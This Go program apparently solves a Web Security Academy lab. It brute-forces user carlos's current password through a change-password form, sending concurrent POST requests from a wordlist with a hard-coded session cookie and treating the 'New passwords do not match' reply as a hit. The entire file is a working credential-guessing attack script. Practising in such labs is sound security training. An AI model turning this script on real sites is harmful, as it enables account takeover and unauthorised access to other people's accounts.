package main

import (
	"bufio"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"reflect"
	"strings"
	"sync"
)

var (
	go_routines = 5
	finished    = false
	main_url    = "https://0a8b00ed04522ac081cb024200ad00fe.web-security-academy.net/my-account/change-password" // should NOT end with "/"
	http_client = http.Client{
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}
)

func main() {
	file, err := os.Open("/home/user1/hat/web_sec_academy/auth_vuln/pass.txt")
	if err != nil {
		log.Fatal(err)
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)

	for !finished {
		var wg sync.WaitGroup

		for i := 0; i < go_routines && !finished; i++ {
			if !scanner.Scan() {
				finished = true
				break
			}

			pass := scanner.Text()
			wg.Add(1)
			go flow(pass, &wg)
		}

		wg.Wait()
	}
}

func flow(pass string, wg *sync.WaitGroup) {
	fmt.Println(pass)
	defer wg.Done()

	data := strings.NewReader(fmt.Sprintf("username=%s&current-password=%s&new-password-1=%s&new-password-2=%s", "carlos", pass, "cc", "ii"))

	req, _ := http.NewRequest(http.MethodPost, main_url, data)
	req.Header.Add("Cookie", "session=xKZqiJwe4s2GZNrEcMADVBkwA9ANIBJh")
	req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
	resp, err := http_client.Do(req)
	if err != nil {
		return
	}
	defer resp.Body.Close()

	bodyBytes, err := io.ReadAll(resp.Body)
	if err != nil {
		return
	}
	html := string(bodyBytes)

	if strings.Contains(html, "New passwords do not match") {
		finished = true
		fmt.Println("------")
		fmt.Println("------")
		fmt.Println(pass)

		for _, key := range reflect.ValueOf(resp.Header).MapKeys() {
			value := resp.Header[key.String()]
			fmt.Println("Key:", key, "; Value:", value)
		}
	}
}
